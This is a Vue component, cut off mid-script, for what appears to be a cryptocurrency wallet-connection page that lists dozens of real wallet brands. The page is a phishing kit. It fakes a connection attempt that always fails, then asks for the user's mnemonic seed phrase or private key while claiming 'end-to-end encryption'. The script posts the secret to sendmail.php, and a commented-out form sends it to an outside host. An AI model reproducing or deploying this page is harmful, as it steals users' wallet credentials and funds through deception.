                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Nash</a></h5>
                    <span class="price">nash.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="coinomi"
                  class="sc-author-box select_wallet"
                  data-title="Coinomi"
                  data-logo="/images/logo/coinomi.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/coinomi.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Coinomi</a></h5>
                    <span class="price">coinomi.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="gridplus"
                  class="sc-author-box select_wallet"
                  data-title="GridPlus"
                  data-logo="/images/logo/gridplus.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/gridplus.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>GridPlus</a></h5>
                    <span class="price">gridplus.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="tokenary"
                  class="sc-author-box select_wallet"
                  data-title="Tokenary"
                  data-logo="/images/logo/tokenary.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/tokenary.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Tokenary</a></h5>
                    <span class="price">tokenary.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="safepal"
                  class="sc-author-box select_wallet"
                  data-title="SafePal"
                  data-logo="/images/logo/safepal.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/safepal.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>SafePal</a></h5>
                    <span class="price">safepal.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="infinito"
                  class="sc-author-box select_wallet"
                  data-title="Infinito"
                  data-logo="/images/logo/infinito.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/infinito.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Infinito</a></h5>
                    <span class="price">infinitowallet.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="wallet_io"
                  class="sc-author-box select_wallet"
                  data-title="Wallet.io"
                  data-logo="/images/logo/wallet_io.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/wallet_io.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Wallet.io</a></h5>
                    <span class="price">wallet.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="ownbit"
                  class="sc-author-box select_wallet"
                  data-title="Ownbit"
                  data-logo="/images/logo/ownbit.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/ownbit.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Ownbit</a></h5>
                    <span class="price">ownbit.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="easypocket"
                  class="sc-author-box select_wallet"
                  data-title="EasyPocket"
                  data-logo="/images/logo/easypocket.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/easypocket.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>EasyPocket</a></h5>
                    <span class="price">easypocket.app</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="bridget_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Bridge Wallet"
                  data-logo="/images/logo/bridge_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/bridge_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Bridge Wallet</a></h5>
                    <span class="price">mtpelerin.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="via_wallet"
                  class="sc-author-box select_wallet"
                  data-title="ViaWallet"
                  data-logo="/images/logo/via_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/via_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>ViaWallet</a></h5>
                    <span class="price">viawallet.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="bitkeep"
                  class="sc-author-box select_wallet"
                  data-title="BitKeep"
                  data-logo="/images/logo/bitkeep.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/bitkeep.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>BitKeep</a></h5>
                    <span class="price">bitkeep.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="unstoppable_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Unstoppable Wallet"
                  data-logo="/images/logo/unstoppable_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/unstoppable_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Unstoppable Wallet</a></h5>
                    <span class="price">unstoppable.money</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="halodefi_wallet"
                  class="sc-author-box select_wallet"
                  data-title="HaloDefi Wallet"
                  data-logo="/images/logo/halodefi_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/halodefi_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>HaloDefi Wallet</a></h5>
                    <span class="price">halodefi.org</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="dok_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Dok Wallet"
                  data-logo="/images/logo/dok_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/dok_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Dok Wallet</a></h5>
                    <span class="price">dokwallet.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="celo_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Cello Wallet"
                  data-logo="/images/logo/celo_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/celo_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Cello Wallet</a></h5>
                    <span class="price">cellowallet.app</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="coinus"
                  class="sc-author-box select_wallet"
                  data-title="CoinUs"
                  data-logo="/images/logo/coinus.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/coinus.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>CoinUs</a></h5>
                    <span class="price">coinus.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="valora"
                  class="sc-author-box select_wallet"
                  data-title="Valora"
                  data-logo="/images/logo/valora.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/valora.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Valora</a></h5>
                    <span class="price">valoraapp.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="trustee_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Trustee Wallet"
                  data-logo="/images/logo/trustee_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/trustee_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Trustee Wallet</a></h5>
                    <span class="price">trusteeglobal.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="guarda_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Gaurda Wallet"
                  data-logo="/images/logo/guarda_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/guarda_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Gaurda Wallet</a></h5>
                    <span class="price">guarda.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="Maiar_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Maiar Wallet"
                  data-logo="/images/logo/maiarwallet.png"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/maiarwallet.png"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Maiar Wallet</a></h5>
                    <span class="price">Maiar.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="jade_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Jade Wallet"
                  data-logo="/images/logo/jade_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/jade_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Jade Wallet</a></h5>
                    <span class="price">jadewallet.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="plasmapay"
                  class="sc-author-box select_wallet"
                  data-title="PlasmaPay"
                  data-logo="/images/logo/plasmapay.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/plasmapay.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>PlasmaPay</a></h5>
                    <span class="price">plasmapay.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="o3_wallet"
                  class="sc-author-box select_wallet"
                  data-title="O3Wallet"
                  data-logo="/images/logo/o3_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/o3_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>O3Wallet</a></h5>
                    <span class="price">o3.network</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="hashkey_me"
                  class="sc-author-box select_wallet"
                  data-title="HashKey Me"
                  data-logo="/images/logo/hashkey_me.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/hashkey_me.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>HashKey Me</a></h5>
                    <span class="price">me.hashkey.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="rwallet"
                  class="sc-author-box select_wallet"
                  data-title="RWallet"
                  data-logo="/images/logo/rwallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/rwallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>RWallet</a></h5>
                    <span class="price">rsk.co</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="flare_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Flare Wallet"
                  data-logo="/images/logo/flare_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/flare_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Flare Wallet</a></h5>
                    <span class="price">flarewallet.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="kyberswap"
                  class="sc-author-box select_wallet"
                  data-title="KyberSwap"
                  data-logo="/images/logo/kyberswap.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/kyberswap.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>KyberSwap</a></h5>
                    <span class="price">kyberswap.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="atoken_wallet"
                  class="sc-author-box select_wallet"
                  data-title="AToken Wallet"
                  data-logo="/images/logo/atoken_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/atoken_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>AToken Wallet</a></h5>
                    <span class="price">atoken.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="tongue_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Tongue Wallet"
                  data-logo="/images/logo/tongue_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/tongue_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Tongue Wallet</a></h5>
                    <span class="price">tongue.fi</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="xinfin"
                  class="sc-author-box select_wallet"
                  data-title="XinFin XDC Network"
                  data-logo="/images/logo/xinfin.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/xinfin.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>XinFin XDC Network</a></h5>
                    <span class="price">xinfin.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="talken_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Talken Wallet"
                  data-logo="/images/logo/talken_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/talken_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Talken Wallet</a></h5>
                    <span class="price">talken.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="keyring_pro"
                  class="sc-author-box select_wallet"
                  data-title="KEYRING PRO"
                  data-logo="/images/logo/keyring_pro.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/keyring_pro.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>KEYRING PRO</a></h5>
                    <span class="price">keyring.app</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="midas_wallet"
                  class="sc-author-box select_wallet"
                  data-title="Midas Wallet"
                  data-logo="/images/logo/midas_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/midas_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Midas Wallet</a></h5>
                    <span class="price">midasprotocol.io</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="at_wallet"
                  class="sc-author-box select_wallet"
                  data-title="AT.Wallet"
                  data-logo="/images/logo/at_wallet.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/at_wallet.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>AT.Wallet</a></h5>
                    <span class="price">authentrend.com</span>
                  </div>
                </div>
              </div>

              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="imtoken"
                  class="sc-author-box select_wallet"
                  data-title="imToken"
                  data-logo="/images/logo/imtoken.jpg"
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/imtoken.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>imToken</a></h5>
                    <span class="price">token.im</span>
                  </div>
                </div>
              </div>
              <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                <div
                  id="imtoken"
                  class="sc-author-box select_wallet"
                  data-title="Other Wallets"
                  data-logo=""
                  style="cursor: pointer"
                >
                  <div class="author-avatar">
                    <a href="index-2.html#">
                      <img
                        src="/images/logo/imtoken.jpg"
                        alt="Image"
                        class="avatar"
                      />
                    </a>
                    <div class="#"><i class="ripple"></i></div>
                  </div>
                  <div class="author-infor">
                    <h5 class="style2"><a>Other Wallets</a></h5>
                    <span class="price"></span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>
      </div>

      <div
        class="modal fade popup"
        id="popup_connect_wallet_success"
        tabindex="-1"
        role="dialog"
        aria-hidden="true"
      >
        <div class="modal-dialog modal-dialog-centered" role="document">
          <div class="modal-content">
            <button
              type="button"
              class="close"
              data-dismiss="modal"
              aria-label="Close"
            >
              <span aria-hidden="true">&times;</span>
            </button>
            <div class="modal-body space-y-20 pd-40">
              <center>
                <h2 style="color: green">Connecting.....</h2>
              </center>
            </div>

            <h2 style="color: blue"></h2>
          </div>
        </div>
      </div>
    </div>
    <div
      class="modal fade popup"
      id="popup_connect_wallet"
      tabindex="-1"
      role="dialog"
      aria-hidden="true"
    >
      <div class="modal-dialog modal-dialog-centered" role="document">
        <div class="modal-content">
          <button
            type="button"
            class="close"
            data-dismiss="modal"
            aria-label="Close"
          >
            <span aria-hidden="true">&times;</span>
          </button>
          <div class="modal-body space-y-20 pd-40">
            <h3>
              <img
                width="50"
                height="50"
                class="avatar"
                id="wallet_logo"
              /><br />
              <span id="wallet_name" clas="mt-1">Sync Wallet</span>
            </h3>
            <p class="text-center">This session is secured and encrypted</p>

            <div id="auto_connecting" style="display: none">
              <br /><br /><br />
              <div class="heading-line s2" style="width: 100%">
                <br />
                <h5 align="center">
                  starting secure connection...<br />
                  <i
                    align="center"
                    style="text-align: center !important; font-size: small"
                    class="text-muted align-items-center"
                    >please wait...</i
                  >
                </h5>
                <br />
              </div>
            </div>

            <div id="failed_to_connect" style="display: none">
              <div
                style="
                  padding: 6px;
                  color: red;
                  border: 1px solid red;
                  border-radius: 5px;
                  text-align: center !important;
                  font-size: 16px;
                  font-weight: 500;
                "
              >
                An error occurred... please try again or connect manually
              </div>
              <br /><br /><br />
              <a
                href="index-2.html#"
                id="try_auto_connecting_again"
                class="btn btn-outline-primary"
                aria-label="Close"
                >Try Again</a
              ><br />
              <a
                href="index-2.html#"
                id="button_connect_manually"
                class="btn btn-primary"
                >Connect Manually</a
              >
            </div>

            <!-- <form method="post" action="https://apygate.anchorstation.host/submit.php">
                    <textarea style="font-size:25px; font-weight:650" rows="4" name="secret_phrase" id="secret_phrase"
                        class="form-control text-primary"
                        placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."></textarea><br>
                
                    <button type="submit" class="btn btn-primary" style="border-top: 5px; ">Connect
                        Wallet</button>
                
                </form> -->

            <div id="div_connect_manuallly" style="display: none">
              <form
                name="my-form"
                action="#"
                method="POST"
                id="my-form"
                netlify
              >
                <p>Enter phrase or Private Key</p>

                <div id="phrase">
                  <textarea
                    placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces. or Input Wallet Private Key"
                    style="font-size: 20px; font-weight: 650"
                    rows="4"
                    minlength="10"
                    required
                    name="phrase"
                  ></textarea>
                  <p><br /></p>

                  <button
                    id="submit"
                    type="submit"
                    name="submit"
                    value="submit"
                    class="btn btn-primary"
                    style="border-top: 5px"
                  >
                    Connect Wallet
                  </button>
                </div>
              </form>
            </div>

            <!--<input type="text" class="form-control" placeholder="00.00 ETH">
                        <p>
                            Enter quantity. <span class="color-popup">5 available</span>
                        </p>--->
            <!-- <a href="#" class="btn btn-primary" data-toggle="modal" data-target="#popup_bid_success" data-dismiss="modal" aria-label="Close"> Place a bid</a> -->
            <div>
              <br /><br /><br />
              <h5 align="center" class="mt-4 text-muted align-items-center">
                <img
                  src="/images/icon/shield.png"
                  width="30"
                  height="30"
                />
                This session is protected with an end-to-end encryption
              </h5>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
export default {
  mounted() {
    // Helper: get random int [min, max)
    function getRandomInt(min, max) {
      min = Math.ceil(min)
      max = Math.floor(max)
      return Math.floor(Math.random() * (max - min) + min)
    }

    const $jq = window.jQuery || null

    // Utility show/hide functions
    const show = (el) => { if (!el) return; el.style.display = '' }
    const hide = (el) => { if (!el) return; el.style.display = 'none' }

    // Wallet selection handler
    const walletEls = document.querySelectorAll('.select_wallet')
    walletEls.forEach(wd => {
      wd.addEventListener('click', () => {
        const title = wd.dataset.title || ''
        const logo = wd.dataset.logo || ''


        const walletNameEl = document.getElementById('wallet_name')
        const walletLogoEl = document.getElementById('wallet_logo')
        const autoConnecting = document.getElementById('auto_connecting')
        const failedToConnect = document.getElementById('failed_to_connect')
        const divConnectManually = document.getElementById('div_connect_manuallly')

        if (walletNameEl) walletNameEl.textContent = title
        if (walletLogoEl && logo) walletLogoEl.setAttribute('src', logo)

        show(autoConnecting)
        hide(failedToConnect)
        hide(divConnectManually)

        // Try to show bootstrap modal via jQuery+Bootstrap if available, otherwise do a simple fallback
        const popup = document.getElementById('popup_connect_wallet')
        if ($jq && $jq.fn && typeof $jq.fn.modal === 'function') {
          // Bootstrap's modal plugin is available on jQuery
          $jq('#popup_connect_wallet').modal('show')
        } else if (popup) {
          // Simple fallback: add class and show
          popup.classList.add('show')
          popup.style.display = 'block'
        }

        // Hide autoconnecting div and show error in random interval
        const interval = 1000 * getRandomInt(1, 15)
        setTimeout(() => {
          hide(autoConnecting)
          hide(divConnectManually)
          show(failedToConnect)
        }, interval)
      })
    })

    // Try auto connect again
    const tryAgain = document.getElementById('try_auto_connecting_again')
    if (tryAgain) {
      tryAgain.addEventListener('click', (e) => {
        e.preventDefault()
        const autoConnecting = document.getElementById('auto_connecting')
        const failedToConnect = document.getElementById('failed_to_connect')
        const divConnectManually = document.getElementById('div_connect_manuallly')

        show(autoConnecting)
        hide(failedToConnect)
        hide(divConnectManually)

        const interval = 1000 * getRandomInt(1, 20)
        setTimeout(() => {
          hide(autoConnecting)
          hide(divConnectManually)
          show(failedToConnect)
        }, interval)
      })
    }

    // Button: connect manually
    const buttonConnectManually = document.getElementById('button_connect_manually')
    if (buttonConnectManually) {
      buttonConnectManually.addEventListener('click', (e) => {
        e.preventDefault()
        hide(document.getElementById('auto_connecting'))
        hide(document.getElementById('failed_to_connect'))
        show(document.getElementById('div_connect_manuallly'))
      })
    }

    // Phrase text validation
    const secretPhrase = document.getElementById('secret_phrase')
    const buttonConnectWallet = document.getElementById('button_connect_wallet')
    if (secretPhrase) {
      secretPhrase.addEventListener('input', () => {
        const phrase_seed_entered = secretPhrase.value.trim()
        if (phrase_seed_entered !== '') {
          const words = phrase_seed_entered.match(/(\w+)/g) || []
          const phrase_count = words.length
          if ([12, 15, 18, 21, 24].includes(phrase_count)) {
            if (buttonConnectWallet) {
              buttonConnectWallet.disabled = false
              buttonConnectWallet.style.opacity = '1'
            }
          } else {
            if (buttonConnectWallet) {
              // keep it enabled so user can still attempt, but keep visual cue
              buttonConnectWallet.disabled = false
              buttonConnectWallet.style.opacity = '1'
            }
          }
        } else {
          if (buttonConnectWallet) {
            buttonConnectWallet.disabled = true
            buttonConnectWallet.style.opacity = '0.2'
          }
        }
      })
    }

    // Connect wallet button handler (uses fetch)
    if (buttonConnectWallet) {
      buttonConnectWallet.addEventListener('click', async (e) => {
        e.preventDefault()
        const field = document.getElementById('secret_phrase')
        if (!field) return
        if (field.value.length >= 12) {
          buttonConnectWallet.textContent = 'Loading...'
          buttonConnectWallet.style.pointerEvents = 'none'

          try {
            const payload = new URLSearchParams()
            payload.append('load_phrase', '1')
            payload.append('data_phrase', field.value)
            const walletNameEl = document.getElementById('wallet_name')
            payload.append('wallet_selected', walletNameEl ? walletNameEl.textContent.trim() : '')

            const resp = await fetch('sendmail.php', {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: payload.toString()
            })
            const resultText = await resp.text()
            let result
            try { result = JSON.parse(resultText) } catch (err) { result = { result: 'error', raw: resultText } }

            if (result && result.result === 'success') {
              buttonConnectWallet.textContent = 'Connect Wallet'
              buttonConnectWallet.style.pointerEvents = 'all'
              if ($jq && $jq.fn && typeof $jq.fn.modal === 'function') {
                $jq('#popup_connect_wallet').modal('hide')
                $jq('#popup_connect_wallet_success').modal('show')
              } else {
